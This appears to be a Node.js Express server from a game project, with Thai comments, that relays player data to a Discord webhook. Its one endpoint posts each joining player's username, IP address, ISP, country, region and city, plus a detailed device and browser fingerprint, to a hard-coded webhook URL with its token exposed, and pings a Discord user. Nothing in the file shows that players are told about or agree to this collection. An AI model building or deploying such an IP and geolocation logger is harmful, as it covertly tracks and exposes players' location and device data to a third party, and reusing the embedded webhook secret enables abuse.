const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1388197670891294931/OW78wRq5df6Vs6YrEkjASR6KEM5vWZV5zrVKQ8mgLoOB4t_yCiwxYDhiPWTedibRLiBk';

app.post('/notify-discord', async (req, res) => {
  const { roomId, playerId, username, ip, clientInfo, locationInfo } = req.body;

  const message = "<@918384557131173988>"

  // สร้าง embed สำหรับ Discord
  const embed = {
    title: "🎮 ผู้เล่นใหม่เข้าร่วมเกม!",
    color: 0x00ff00, // สีเขียว
    timestamp: new Date().toISOString(),
    thumbnail: {
      url: "https://cdn.discordapp.com/attachments/123456789/game-icon.png" // เปลี่ยนเป็น URL ไอคอนเกมของคุณ
    },
    fields: [
      {
        name: "🏠 ข้อมูลห้อง",
        value: `**Room ID:** ${roomId}\n**Player ID:** ${playerId}\n**Username:** ${username}`,
        inline: false
      },
      {
        name: "🌐 ข้อมูลเครือข่าย",
        value: `**IP Address:** ${ip}\n**ISP:** ${locationInfo.isp}\n**Organization:** ${locationInfo.org}`,
        inline: true
      },
      {
        name: "📍 ตำแหน่งที่ตั้ง",
        value: `**ประเทศ:** ${locationInfo.country} :flag_${locationInfo.countryCode.toLowerCase()}:\n**จังหวัด:** ${locationInfo.region}\n**เมือง:** ${locationInfo.city}`,
        inline: true
      },
      {
        name: "💻 ข้อมูลอุปกรณ์",
        value: `**อุปกรณ์:** ${clientInfo.deviceType}\n**ระบบปฏิบัติการ:** ${clientInfo.platform}\n**CPU Cores:** ${clientInfo.hardwareConcurrency}`,
        inline: true
      },
      {
        name: "🌏 เบราว์เซอร์",
        value: `**เบราว์เซอร์:** ${clientInfo.browser} ${clientInfo.browserVersion}\n**ภาษา:** ${clientInfo.language}\n**Connection:** ${clientInfo.connectionType}`,
        inline: true
      },
      {
        name: "🖥️ ข้อมูลหน้าจอ",
        value: `**ความละเอียด:** ${clientInfo.screenResolution}\n**Color Depth:** ${clientInfo.screenColorDepth}-bit\n**Window Size:** ${clientInfo.windowSize}`,
        inline: true
      },
      {
        name: "🕐 เวลา",
        value: `**Timezone:** ${clientInfo.timezone}\n**เวลาท้องถิ่น:** ${clientInfo.localTime}`,
        inline: true
      },
      {
        name: "🔗 ข้อมูลเพิ่มเติม",
        value: `**Referrer:** ${clientInfo.referrer}\n**Cookie Enabled:** ${clientInfo.cookieEnabled ? '✅' : '❌'}\n**Online Status:** ${clientInfo.onLine ? '🟢' : '🔴'}`,
        inline: false
      }
    ],
  };

  try {
    await axios.post(DISCORD_WEBHOOK_URL, {
      content: message,
      embeds: [embed]
    });
    
    console.log(`✅ แจ้งเตือนสำเร็จ: ${username} เข้าร่วมห้อง ${roomId}`);
    res.json({ ok: true, message: 'Notification sent successfully' });
  } catch (err) {
    console.error('❌ Error sending Discord notification:', err.message);
    res.status(500).json({ ok: false, error: err.message });
  }
});

// เพิ่ม endpoint สำหรับทดสอบ
app.get('/test', (req, res) => {
  res.json({ 
    status: 'Server is running!', 
    timestamp: new Date().toISOString() 
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server started on port ${PORT}`);
});